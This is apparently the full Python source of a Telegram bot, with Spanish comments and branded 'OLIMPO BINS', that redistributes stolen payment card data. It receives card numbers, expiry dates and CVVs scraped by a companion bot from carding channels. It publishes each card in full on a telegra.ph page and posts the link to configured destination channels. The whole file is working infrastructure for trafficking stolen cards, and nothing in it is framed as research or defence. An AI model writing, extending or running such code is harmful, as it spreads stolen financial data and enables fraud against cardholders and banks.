# bot2.py
import os
import json
import aiohttp
import asyncio
import logging
from datetime import datetime
from typing import Optional, Dict, List
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger(__name__)

# Configuración
BOT_TOKEN_2 = os.environ.get("BOT_TOKEN_2")
BOT1_ID = int(os.environ.get("BOT1_ID", 8614851086))

# Validar variables
if not BOT_TOKEN_2:
    raise ValueError("La variable BOT_TOKEN_2 es obligatoria")

# Configuración de canales destino (MODIFICA ESTOS VALORES)
CHANNEL_MAPPING = {
    "@viplunaticscrapper": "@canal_destino_vip",  # Cambiar por tu canal real
    "@AsukaScr": "",          # Cambiar por tu canal real
    "-1003636233013": "@canal_destino_exclusive", # Cambiar por tu canal real
}

app = Client("bot2", bot_token=BOT_TOKEN_2)

# ==================== TELEGRAPH ====================
async def create_telegraph_article(card_data: str, source_info: str) -> Optional[str]:
    """Crea artículo en telegra.ph estilo AsukaFree"""
    try:
        # Parsear datos de la tarjeta (formato: NÚMERO|MES|AÑO|CVV)
        parts = card_data.split("|")
        if len(parts) >= 4:
            card_num = parts[0].strip()
            month = parts[1].strip()
            year = parts[2].strip()
            cvv = parts[3].strip()
            bin_num = card_num[:6] if len(card_num) >= 6 else "UNKNOWN"
        else:
            logger.warning(f"Formato de tarjeta inválido: {card_data}")
            return None
        
        # Crear contenido HTML (formato estilo AsukaFree)
        title = f"💳 Tarjeta {bin_num}"
        content = [
            "<h3>OLIMPO FREE SCRAPPER</h3>",
            "<h4>💳 Tarjeta Encontrada</h4>",
            f"<blockquote>{card_data}</blockquote>",
            "<hr>",
            "<h4>🔍 Información</h4>",
            f"<p><b>Bin:</b> {bin_num}</p>",
            f"<p><b>Fecha:</b> {month}/{year}</p>",
            f"<p><b>CVV:</b> {cvv if cvv != 'xxx' else 'UNAVAILABLE'}</p>",
            "<hr>",
            "<h4>🌍 Metadata</h4>",
            f"<p><b>Fuente:</b> {source_info}</p>",
            f"<p><b>Timestamp:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
            "<hr>",
            "<p><i>Publicado por Bot Redistribuidor</i></p>"
        ]
        
        # Enviar a telegra.ph
        async with aiohttp.ClientSession() as session:
            payload = {
                "title": title,
                "author_name": "OLIMPO BINS",
                "author_url": "https://t.me/",
                "content": json.dumps(content),
                "return_content": False
            }
            
            async with session.post(
                "https://api.telegra.ph/createPage",
                json=payload,
                timeout=30
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("ok"):
                        telegraph_url = data["result"]["url"]
                        logger.info(f"✅ Artículo telegra.ph creado: {telegraph_url}")
                        return telegraph_url
                    else:
                        logger.error(f"❌ Error de telegra.ph: {data.get('error')}")
                else:
                    logger.error(f"❌ HTTP error: {response.status}")
        
        return None
    except Exception as e:
        logger.error(f"❌ Error creando artículo telegra.ph: {e}")
        return None

# ==================== HANDLERS ====================
@app.on_message(filters.private)
async def handle_bot1_message(client, message):
    """Procesa mensajes del Bot 1"""
    logger.info(f"📨 Mensaje recibido de usuario ID: {message.from_user.id}")
    
    # Verificar que es el Bot 1
    if message.from_user and message.from_user.id == BOT1_ID:
        if message.text and message.text.startswith("💳|"):
            try:
                # Parsear el mensaje: 💳|card_data|source_info
                parts = message.text.split("|", 2)
                if len(parts) >= 3:
                    _, card_data, source_info = parts
                    logger.info(f"📋 Procesando tarjeta desde: {source_info}")
                    
                    # 1. Crear artículo en telegra.ph
                    telegraph_url = await create_telegraph_article(card_data, source_info)
                    
                    if telegraph_url:
                        # 2. Redistribuir a canal destino según el origen
                        # Extraer el origen principal (primer elemento después de "Chat:")
                        origin_key = None
                        if "Chat:" in source_info:
                            # Buscar el identificador del chat en source_info
                            for chat_id in CHANNEL_MAPPING.keys():
                                if chat_id in source_info:
                                    origin_key = chat_id
                                    break
                        
                        if origin_key and origin_key in CHANNEL_MAPPING:
                            destination = CHANNEL_MAPPING[origin_key]
                            # Enviar con formato bonito
                            message_text = f"""
🎯 <b>NUEVA TARJETA DISPONIBLE</b>

💳 <b>Bin:</b> {card_data[:6]}
🔗 <b>Enlace:</b> {telegraph_url}

📡 <b>Fuente:</b> {origin_key}
⏰ <b>Hora:</b> {datetime.now().strftime('%H:%M:%S')}

#OLIMPOBINS
                            """
                            
                            await app.send_message(
                                destination,
                                message_text,
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=False
                            )
                            logger.info(f"✅ Enviado a destino: {destination}")
                        else:
                            logger.warning(f"⚠️ No hay destino configurado para: {source_info}")
                    else:
                        logger.error("❌ Error: No se pudo crear artículo telegra.ph")
                        
            except Exception as e:
                logger.error(f"❌ Error procesando mensaje del Bot 1: {e}")
        else:
            logger.warning(f"⚠️ Mensaje no reconocido del Bot 1: {message.text}")
    else:
        logger.warning(f"⚠️ Mensaje de usuario no autorizado: {message.from_user.id}")

# ==================== COMMANDS ====================
@app.on_message(filters.command("start"))
async def start_command(client, message):
    """Comando start"""
    await message.reply(
        "🤖 **Bot 2 - Redistribuidor**\n\n"
        "✅ Estoy listo para procesar tarjetas del Bot 1\n"
        f"📡 ID Bot 1 configurado: `{BOT1_ID}`\n"
        f"📊 Canales destino configurados: {len(CHANNEL_MAPPING)}"
    )

@app.on_message(filters.command("status"))
async def status_command(client, message):
    """Comando de estado"""
    status_msg = "✅ **Estado del Bot 2**\n\n"
    status_msg += "• 🟢 Funcionando correctamente\n"
    status_msg += f"• 📋 Canales configurados: {len(CHANNEL_MAPPING)}\n"
    status_msg += "• 👂 Esperando mensajes del Bot 1\n\n"
    status_msg += "**Canales mapeados:**\n"
    
    for origin, destination in CHANNEL_MAPPING.items():
        status_msg += f"  └ {origin} → {destination}\n"
    
    await message.reply(status_msg, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("map"))
async def map_command(client, message):
    """Ver mapeo de canales"""
    mapping_text = "🗺️ **Mapeo de Canales**\n\n"
    for origin, destination in CHANNEL_MAPPING.items():
        mapping_text += f"• {origin} → {destination}\n"
    
    await message.reply(mapping_text, parse_mode=ParseMode.MARKDOWN)

if __name__ == "__main__":
    logger.info("🤖 Bot 2 Redistribuidor iniciando...")
    logger.info(f"📡 ID Bot 1 configurado: {BOT1_ID}")
    logger.info(f"📊 Canales destino: {list(CHANNEL_MAPPING.keys())}")
    app.run()
